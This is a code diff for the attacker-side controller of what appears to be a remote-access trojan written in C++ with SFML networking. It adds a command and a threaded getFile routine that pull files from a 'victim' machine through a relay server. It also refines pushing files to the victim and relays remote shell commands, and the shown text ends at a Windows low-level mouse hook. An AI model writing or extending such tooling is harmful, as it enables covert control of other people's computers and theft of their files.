@@ -66,16 +66,12 @@ int Attacker::update()
 			std::string line = tui.ssh_commands.front();
 			tui.ssh_commands.pop();
 
-			//tui.printSshShell(" > " + line + "\n");
-
 			sf::Packet req;
 			req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
 			auto _ = server.send(req);
 		}
-		else {
+		else
 			tui.ssh_commands = std::queue<std::string>();
-			tui.printSshShell("ssh is not active\n");
-		}
 	}
 	
 	while (packetsToProcess.size() > 0) {
@@ -276,9 +272,8 @@ bool Attacker::handleCmd(const std::string& s)
 				current.clear();
 			}
 		}
-		else {
+		else
 			current += c;
-		}
 	}
 
 	if (!current.empty())
@@ -589,6 +584,7 @@ bool Attacker::handleCmd(const std::string& s)
 			return true;
 		}
 
+		//check if source file is valid
 		std::ifstream file(param[0], std::ifstream::ate | std::ifstream::binary);
 		auto size = file.tellg();
 		if (size == -1) {
@@ -605,6 +601,7 @@ bool Attacker::handleCmd(const std::string& s)
 			return true;
 		}
 
+		//wait for victim response
 		tui.printServerShell("preparing to send " + std::to_string(numPackets) + " packets: [");
 		for (int i = 0; i < 10; i++) {
 			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
@@ -636,7 +633,7 @@ bool Attacker::handleCmd(const std::string& s)
 				sendFileThread = new std::thread(&Attacker::sendFile, this, param[0], numPackets);
 			}
 			else
-				tui.printServerShell("victim refused file transfer\n");
+				tui.printServerShell("invalid destination file path\n");
 		}
 	}
 	else if (cmd == "stopsend") {
@@ -669,7 +666,68 @@ bool Attacker::handleCmd(const std::string& s)
 			return true;
 		}
 
+		std::string destFilePath, destFileExt;
+		if (param[1].find_last_of('.') != std::string::npos) {
+			destFilePath = param[1].substr(0, param[1].find_last_of('.'));
+			destFileExt = param[1].substr(param[1].find_last_of('.'));
+		}
+		else {
+			destFilePath = param[1];
+			destFileExt = "";
+		}
 
+		//check if destination file is valid
+		std::ofstream file(destFilePath);
+		if (!file.good()) {
+			tui.printServerShell("invalid destination file path\n");
+			return true;
+		}
+		
+		sf::Packet req;
+		uint16_t reqId = requestId++;
+		req << reqId << uint8_t(Cmd::SSH_START_GETTING_FILE) << param[0];
+		if (server.send(req) != sf::Socket::Status::Done) {
+			tui.printServerShell("failed to send request to server\n");
+			return true;
+		}
+
+		//wait for victim response
+		tui.printServerShell("preparing to get file: [");
+		for (int i = 0; i < 10; i++) {
+			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+				tui.printServerShell("*");
+				sf::sleep(sf::milliseconds(500));
+			}
+			else
+				tui.printServerShell(".");
+		}
+		tui.printServerShell("] - ");
+
+		if (responsesToProcess.find(reqId) == responsesToProcess.end())
+			tui.printServerShell("request timed out\n");
+		else {
+			sf::Packet res = responsesToProcess[reqId];
+			responsesToProcess.erase(reqId);
+
+			uint32_t numPackets = 0;
+			uint8_t code = 0;
+			res >> code >> numPackets;
+			if (numPackets > 0) {
+				isGettingFile = true;
+				tui.printServerShell("expecting " + std::to_string(numPackets) + " packets\n");
+
+				if (getFileThread != nullptr) {
+					getFileThread->join();
+					delete getFileThread;
+				}
+				getFileThread = new std::thread(&Attacker::getFile, this, destFilePath, destFileExt, numPackets);
+			}
+			else {
+				file.close();
+				std::remove(destFilePath.c_str());
+				tui.printServerShell("invalid source file path\n");
+			}
+		}
 	}
 	else if (cmd == "stopget") {
 		if (param.size() != 0) {
@@ -763,34 +821,34 @@ void Attacker::updateList(sf::Packet& p)
 	tui.setClientsOutput(ss_clients.str());
 }
 
-void Attacker::sendFile(std::string path, uint32_t numPackets)
-{
+void Attacker::sendFile(std::string path, uint32_t numPackets) {
 	tui.setSendingFileProgress(0);
 
 	std::ifstream file(path, std::ios::binary);
 	size_t packetNum = 0;
 	while (file.good() && !stopSendingFile) {
-		char* buffer = new char[packetSize];
-		file.read(buffer, packetSize);
+		std::unique_ptr<char[]> buffer(new char[packetSize]());
+		file.read(buffer.get(), packetSize);
 		size_t bytesRead = file.gcount();
 
 		if (bytesRead <= 0)
 			break;
 
-		sf::Packet p;
+		sf::Packet req;
 		uint16_t reqId = requestId++;
-		p << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
-		p.append(buffer, bytesRead);
-		
-		auto status = server.send(p);
-		if (status != sf::Socket::Status::Done)
+		req << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
+		req.append(buffer.get(), bytesRead);
+
+		if (server.send(req) != sf::Socket::Status::Done)
 			break;
 
+		//wait up to 5 seconds before sending next packet
 		for (int i = 0; i < 10; i++) {
 			if (responsesToProcess.find(reqId) != responsesToProcess.end() || stopSendingFile)
 				break;
 			sf::sleep(sf::milliseconds(500));
 		}
+		//timeout or error
 		if (responsesToProcess.find(reqId) == responsesToProcess.end())
 			break;
 		else 
@@ -799,15 +857,73 @@ void Attacker::sendFile(std::string path, uint32_t numPackets)
 		tui.setSendingFileProgress(++packetNum * 100 / double(numPackets));
 	}
 
+	//set to "idle"
 	if (stopSendingFile)
 		tui.setSendingFileProgress(101);
+	//set to "done"
 	else if (packetNum == numPackets)
 		tui.setSendingFileProgress(100);
+	//set to "error"
 	else
 		tui.setSendingFileProgress(-1);
 	
 	isSendingFile = false;
 	stopSendingFile = false;
+}
+
+void Attacker::getFile(std::string path, std::string ext, uint32_t numPackets)
+{
+	tui.setGettingFileProgress(0);
+
+	size_t packetNum = 0;
+	std::ofstream file(path, std::ios::app | std::ios::binary);
+	while (file.good() && !stopGettingFile && (packetNum < numPackets)) {
+		uint16_t reqId = requestId++;
+		sf::Packet req;
+		req << reqId << uint8_t(Cmd::SSH_GET_FILE_DATA);
+		if (server.send(req) != sf::Socket::Status::Done)
+			break;
+
+		//wait up to 5 seconds before sending next packet
+		for (int i = 0; i < 10; i++) {
+			if (responsesToProcess.find(reqId) != responsesToProcess.end() || stopGettingFile)
+				break;
+			sf::sleep(sf::milliseconds(500));
+		}
+		//timeout or error
+		if (responsesToProcess.find(reqId) == responsesToProcess.end())
+			break;
+		
+		sf::Packet p = responsesToProcess[reqId];
+		responsesToProcess.erase(reqId);
+
+		const void* buffer = p.getData();
+		auto data = static_cast<const char*>(buffer);
+		data += 3;
+		size_t size = p.getDataSize() - 3;
+
+		if (!file.write(data, size))
+			break;
+
+		tui.setGettingFileProgress(++packetNum * 100 / double(numPackets));
+	}
+
+	//set to "idle"
+	if (stopGettingFile)
+		tui.setGettingFileProgress(101);
+	//set to "done"
+	else if (packetNum == numPackets) {
+		file.close();
+		auto _ = std::rename(path.c_str(), (path + ext).c_str());
+
+		tui.setGettingFileProgress(100);
+	}
+	//set to "error"
+	else
+		tui.setGettingFileProgress(-1);
+
+	isGettingFile = false;
+	stopGettingFile = false;
 }
 
 LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
